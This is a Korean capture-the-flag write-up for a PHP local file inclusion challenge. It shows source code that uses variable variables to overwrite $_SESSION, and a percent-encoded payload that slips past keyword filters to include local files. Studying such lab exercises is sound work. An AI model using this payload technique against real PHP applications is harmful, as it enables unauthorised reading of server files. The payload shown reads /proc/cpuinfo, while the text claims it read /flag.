---
layout: post
category: [web]
title: PHP LFI
---

## [문제](http://h4ckingga.me/challenges#Season1%20:%20Real%20PHP%20LFI-32)

## 문제 확인
![prob](/assets/img/2024-08-25-php-real-lfi/webpage.png)

/flag 파일을 LFI 을 통해 플래그를 획득하면 되는 문제이다.

LFI에 대한 설명은 [이전 포스트](https://blog.kafuu.space/2024-08-20-php-lfi/)의 "LFI 란?" 섹션을 참고하자.

## 서버 소스코드
이 문제에는 소스코드가 제공되기 때문에, 소스코드를 확인해보았다.

### config.php
```php
<?php 

// PHP 세션을 만든다.
session_start();

$admin = FALSE;

if($_SERVER['REMOTE_ADDR']){
    $admin = TRUE;
}

// 세션의 'include_path' 를 = 'nav.php' 로 설정.
$_SESSION['include_path'] = 'nav.php';
$_SESSION['admin'] = $admin;

// /, base64 을 필터링한다.
function fuck_path_change_or_check($path){
    if(preg_match("/\//isUD", $path)){
        exit("어이쿠 걸려버렸네?");
    }elseif(preg_match("/base64/i", $path)){
        exit("어이쿠 걸려버렸네?");
    }else{
        // \ 를 / 로 변경한다.
        return str_replace("\\", "/", $path);
    }
}

// _, session 등의 키워드를 필터링합니다.
function fuck_extract_filtering($get){
    if(preg_match("/_|session/isUD", $get)){
        exit("으아닛 이건 안된다구!");
    }else{
        return fuck_path_change_or_check($get);
    }
}

?>
```

### index.php
```php
<?php 

// config.php 를 포함시켜 함수를 사용할 수 있게 한다.
include("config.php");

// $query 변수에 fuck_extract_filtering 결과값을 넣는다 (요청으로 받은 쿼리스트링을 인자로 넘김)
$query = fuck_extract_filtering($_SERVER['QUERY_STRING']);


parse_str($query, $arr); // $arr 변수에 쿼리스트링을 파싱해서 넣는다 key-value 형태의 변수

foreach($arr as $key=>$value){
    // 취약한 부분, Variable variables 를 사용하여 로컬 변수를 key 값으로 덮어씌울수 있음, LFI 를 하기  'nav.php' 를 'flag' 로 바꿔쳐야한다.
    $$key = fuck_path_change_or_check($value);
}

// $_SESSION['include_path'] 값을 include
include($_SESSION['include_path']);

?>

<div style="magin-top:100px;">
안녕하세요 저희는 ElePHPant팀입니다 이번에 PHP 언어를 이용하여 개발 공부를 시작했는데요
아직 많이 부족한 지식으로 테스트용으로 개발된 사이트지만 보기만 하세요.. 보기만 하라니깐요?(^__________^)
</div>
```

(nav.php 는 navbar 템플릿이기 때문에 생략합니다.)


## 공격 방법
이 코드에서는 쿼리스트링 문자열 전체에 대한 필터링과, 쿼리스트링 값이 반복문을 순회하며 필터링된다.

또한 [동적 변수(Variable Variables)](https://www.php.net/manual/en/language.variables.variable.php) 이름으로 사용자의 입력 값을 사용하고 있기 때문에 변수를 덮어씌워버릴 수 있다.

예를 들어
```php
<?php
    $important_variable = "do not touch it"

    $varname = $_GET['varname'];
    $$varname = $_GET['value'];

    echo "Value of important_variable: " . $important_variable
?>
```

위 코드에서 사용자가 ``varname`` 쿼리스트링에 ``important_variable`` 을 넣고, ``value`` 쿼리스트링에 다른 값을 넣게 된다면, 위에 선언되어 있는 변수의 값을 바꿀 수 있을 뿐만 아니라, varname에 GLOBALS 를 이름으로 넣어 조작할 경우, 전역 변수를 조작할수 있다.

``my_script.php?varname=important_variable&value=hacked``

그러므로 이 문제에서 LFI 를 실행하기 위해서는
  - 필터링 함수를 우회해야한다.
  - ``_SESSION['include_path']`` 를 ``/flag`` 로 덮어씌워야한다.

이 두가지의 조건에 맞게 페이로드를 작성하면 된다.

필터링을 우회하기 위해 퍼센트 인코딩을 사용하였다.

| 문자 | 인코딩 |
|---|---|
| / | %2f |
| _ | %5f |
| [ | %5b |
| ] | %5d |
| S | %53 |
| " | %22 |

16진수 아스키코드 값으로 일반적인 환경에서는 필요하지 않지만, 이 문제에서는 필터링을 우회하기 위해 알파벳을 퍼센트 인코딩으로 변환하여 사용하였다.

페이로드는 아래와 같다.

```
/?%5F%53ESSION%5Binclude%5Fpath%5D=%2Fproc%2Fcpuinfo
```

## 결과

``fuck_extract_filtering()`` 함수는 퍼센트 인코딩된 문자열을 필터링하지 못하였다

<!-- ``parse_str()`` 함수가 쿼리 문자열을 파싱하면서 URL 디코딩을 수행하여, 결과적으로 ``$arr['_SESSION']['include_path']`` 가 되었다. -->

foreach 루프에서 가변 변수 기능으로 인해 ``$_SESSION['include_path'] = '/flag'`` 로 덮어씌워져 세션 변수가 변조되었다.

마지막으로 ``include($_SESSION['include_path']);`` 가 실행되면서 ``'/flag'`` 파일의 내용이 포함되어 출력되었습니다.

![flag](/assets/img/2024-08-25-php-real-lfi/flag.png)